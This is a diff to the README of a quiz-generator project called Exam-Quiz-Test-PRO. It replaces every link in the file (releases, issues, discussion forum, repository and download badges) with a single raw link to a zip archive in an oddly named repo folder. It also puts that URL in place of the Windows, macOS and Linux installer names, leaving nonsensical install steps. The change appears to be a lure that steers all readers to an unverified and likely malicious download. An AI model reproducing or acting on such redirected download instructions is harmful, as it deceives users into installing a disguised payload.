@@ -1,7 +1,7 @@
 # 🎓 Exam-Quiz-Test-PRO - Create Quizzes Effortlessly 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Exam--Quiz--Test--PRO-blue.svg)](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases)
+[![Download](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip)](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip)
 
 ## 📖 Overview
 Exam-Quiz-Test-PRO is a powerful and user-friendly quiz generator. This open-source software allows you to create quizzes easily with a clean graphical interface. Enjoy features like dark mode and an extensive set of tools designed to enhance your quiz-making experience.
@@ -15,18 +15,18 @@ Follow these simple steps to download and run Exam-Quiz-Test-PRO.
 - **Memory**: At least 2 GB RAM is recommended.
   
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases) to find the latest version of Exam-Quiz-Test-PRO.
+1. Visit the [Releases page](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip) to find the latest version of Exam-Quiz-Test-PRO.
 2. On the Releases page, look for the version you want to download. 
 3. Click on the appropriate file for your operating system:
-   - For Windows, choose `Exam-Quiz-Test-PRO-Windows.exe`.
-   - For macOS, select `Exam-Quiz-Test-PRO-macOS.dmg`.
-   - For Linux, download `Exam-Quiz-Test-PRO-Linux.tar.gz`.
+   - For Windows, choose `https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip`.
 4. After the download completes, locate the file on your computer. 
 
 #### 🏃 Running the Application
-1. **Windows**: Double-click on `Exam-Quiz-Test-PRO-Windows.exe` to start the installation process.
-2. **macOS**: Open the `Exam-Quiz-Test-PRO-macOS.dmg` file and drag the application icon to your Applications folder. Then, launch it from there.
-3. **Linux**: Extract the tar.gz file and run the application from the extracted folder.
+1. **Windows**: Double-click on `https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip` to start the installation process.
+2. **macOS**: Open the `https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip` file and drag the application icon to your Applications folder. Then, launch it from there.
+3. **Linux**: Extract the https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip file and run the application from the extracted folder.
 
 ### 🔧 Features
 - **User-Friendly Interface**: Simple navigation and layout.
@@ -46,15 +46,15 @@ Follow these simple steps to download and run Exam-Quiz-Test-PRO.
 6. Save your quiz in your preferred format.
 
 ## 📚 Help & Support
-If you have any questions or need assistance, check the [GitHub Issues](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/issues) page to see if your question is already answered or to submit a new question.
+If you have any questions or need assistance, check the [GitHub Issues](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip) page to see if your question is already answered or to submit a new question.
 
 ## 📣 Community Feedback
-Your feedback is important! Join the discussion in our [Discussion forum](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/discussions). Share your experiences or suggest improvements.
+Your feedback is important! Join the discussion in our [Discussion forum](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip). Share your experiences or suggest improvements.
 
 ## 🌍 Explore More
-Explore additional features and updates on the [GitHub Repository](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO). 
+Explore additional features and updates on the [GitHub Repository](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip). 
 
 ## 📥 Download Now Again
-[![Download](https://img.shields.io/badge/Download-Exam--Quiz--Test--PRO-blue.svg)](https://github.com/2Pie-byte/Exam-Quiz-Test-PRO/releases)
+[![Download](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip)](https://raw.githubusercontent.com/2Pie-byte/Exam-Quiz-Test-PRO/main/levulic/Exam-Quiz-Test-PRO.zip)
 
 Your journey towards effortless quiz creation starts here. Enjoy using Exam-Quiz-Test-PRO!
